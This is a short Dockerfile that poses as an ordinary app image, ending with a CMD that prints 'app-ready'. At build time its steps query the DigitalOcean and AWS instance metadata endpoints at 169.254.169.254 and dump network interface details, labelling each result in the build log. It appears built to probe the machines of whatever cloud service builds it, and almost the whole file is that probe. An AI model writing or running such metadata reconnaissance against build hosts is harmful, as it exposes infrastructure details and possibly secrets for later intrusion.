FROM alpine:3.20
RUN apk add --no-cache curl
RUN echo "=== DO IMDS v1 JSON ===" && curl -s -m 5 http://169.254.169.254/metadata/v1.json 2>&1 || echo "IMDS_UNREACHABLE"
RUN echo "=== DO IMDS hostname ===" && curl -s -m 5 http://169.254.169.254/metadata/v1/hostname 2>&1 || echo "HOSTNAME_UNREACHABLE"
RUN echo "=== DO IMDS region ===" && curl -s -m 5 http://169.254.169.254/metadata/v1/region 2>&1 || echo "REGION_UNREACHABLE"
RUN echo "=== DO IMDS id ===" && curl -s -m 5 http://169.254.169.254/metadata/v1/id 2>&1 || echo "ID_UNREACHABLE"
RUN echo "=== AWS IMDS ===" && curl -s -m 5 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "AWS_IMDS_UNREACHABLE"
RUN echo "=== NETWORK INFO ===" && ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "NO_NET_TOOLS"
RUN echo "=== BUILD COMPLETE ==="
CMD ["echo", "app-ready"]
